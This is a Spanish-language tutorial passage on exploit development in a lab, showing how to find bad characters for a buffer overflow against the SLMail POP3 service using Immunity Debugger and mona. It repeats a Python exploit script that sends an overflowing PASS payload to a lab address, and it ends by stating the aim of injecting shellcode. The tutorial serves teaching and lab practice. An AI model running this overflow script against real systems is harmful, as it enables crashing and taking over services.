En la generación de nuestro shellcode malicioso para la explotación del buffer overflow, es posible que algunos caracteres no sean interpretados correctamente por el programa objetivo. Estos caracteres se conocen como “**badchars**” y pueden causar que el shellcode falle o que el programa objetivo se cierre inesperadamente.

Para evitar esto, es importante identificar y eliminar los badchars del shellcode. En esta clase, veremos cómo desde Immunity Debugger podremos aprovechar la funcionalidad **Mona** para generar diferentes bytearrays con casi todos los caracteres representados, y luego identificar los caracteres que el programa objetivo no logra interpretar.

Ahora que tenemos una zona identificada para meter nuestro shellcode lo que vamos hacer es que el EIP apunte a esta zona del ESP pero antes de eso indicaremos cual va a ser nuestro espacio de trabajo lo podemos hacer de la siguiente forma

![[Pasted image 20240308183521.png]]


Esto lo que va hacer es crear un directorio ahora lo que podemos hacer es crear un bytearray de la siguiente manera

![[Pasted image 20240308183948.png]]

Al hacer esto nos crea un archivo en nuestro espacio de trabajo que contiene todas las convinatorias posibles de bytearray


![[Pasted image 20240308184203.png]]


En este caso eliminaremos el null byte ya que esto puedo representar el final de la cadena y puede traer problemas para eliminarlo lo puedes quitar manualmente o hacer el bytearray de la siguiente forma que por medio del parametro cpb defines los badchars a elminar 

![[Pasted image 20240308185506.png]]

Entonces ahora si nos vamos de nuevo a nuestra carpeta y abrimos el archivo de los bytearrays vemos que ahora ya no esta el null byte


![[Pasted image 20240308185649.png]]


Ahora en el ESP vamos a meter toda la cadena resultante y lo que vamos a tratar de ver es que caracter no se esta representado en el ESP si no sale representado es por que es un badchar y el programa por alguna razon no lo interpreta por lo tanto hay que excluirlo entonces nos copiamos  todo el bytearray para luego este utilizarlo para modifcar el exploit de la siguiente manera 


```python
#!/usr/bin/python3.11
import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=b"B"*4

after_eip=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload=before_eip+eip+after_eip

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()



```


Antes de ejecutarlo reinicamos el immunity debugger y el servicio de slmail ya que este ya estaba crasheado anteriormente y ahora si lo ejecutamos 


![[Pasted image 20240308205920.png]]


Al ejecutarlo podemos ver en el ESP que al llegar al 09 salta al 29

![[Pasted image 20240308224358.png]]


Por lo que verificando el bytearray podemos ver que lo que sigue del 09 el es el 0a por lo que este parece ser un badchar y hay que eliminarlo 

![[Pasted image 20240308210408.png]]


Si no quieres buscar de uno por uno los badchas puedes utlizar mona y su utlidad de compare para esto necesitaremos la direccion del registro ESP y el archivo bytearray.bin que se encuentra en nuestra carpeta de trabajo y se utilizaria de la siguiente manera

![[Pasted image 20240308212020.png]]

Al ejecutarlo podemos ver que nos arroja cuales son los badchars


![[Pasted image 20240308212136.png]]

Ahora lo que puedes hacer es volver a ejecutar mona con la utilidad de bytearray y el parametro cpb para hacer un nuevo bytearray pero que no incluya los badchars 


![[Pasted image 20240308214435.png]]

El archivo del bytearray se actualiza automaticamente quitando asi lo badchars especificados

![[Pasted image 20240308214620.png]]

Ahora lo que tenemos que hacer es modifcar el exploit y quitar eliminar los badchars que hemos identificados quedaria de la siguiente manera 

```python
#!/usr/bin/python3.11
import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=b"B"*4

after_eip=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload=before_eip+eip+after_eip

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()




```

Nuevamente reinicmaos el immuntiy debugger y el servicio del slmail para despues ejecutar el exploit

![[Pasted image 20240308215155.png]]

Entonces ahora podemos encontrar rapidamente si hay algun otro badchar con ayuda de mona y la utilidad de compare la cual al utlizarla nos muestra un nuevo badchar que es el 0d

![[Pasted image 20240308221555.png]]

Lo siguente que tenemos que hacer es actualizar nuestro bytearray elimimando los nuevos badchars para eso hacemos lo que hemos hecho anteriormente usando la utlidad de mona bytearray


![[Pasted image 20240308221951.png]]


Ya hecho esto modificamos el exploit y eliminamos el badchar que hemos localizado por lo que quedaria de la siguiente manera

```python
#!/usr/bin/python3.11
import sys
import socket

ip = "192.168.0.2"
port = 110


offset=4655

before_eip=b"A"*offset

eip=b"B"*4

after_eip=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

payload=before_eip+eip+after_eip

def exploit():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((ip, port))

    banner = s.recv(1024)

    s.send(b"USER tumbaburras" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS" + payload + b'\r\n')


    s.close

if __name__ == '__main__':

    exploit()



```


Antes de ejcutarlo nuevamente reinicamos el immunity debugger y el slmail ya reiniciados entonces ahora si  lo ejecutamos 

![[Pasted image 20240308222712.png]]

Y usando mona con la utilidad compare vemos cuales son los nuevos badchars

![[Pasted image 20240308223508.png]]

Al parecer ya no encontro ningun nuevo badchar por lo que ya sabemos cuales caracteres son los que hacen que se corrompa todo y que puedan tenener problemas de cara a la represntacion del shellcode por que ahora podemos generar un shellcode que cargue una instruccion que a mi me interese sin estos badchars para asi lograr inyectar comandos en la maquina
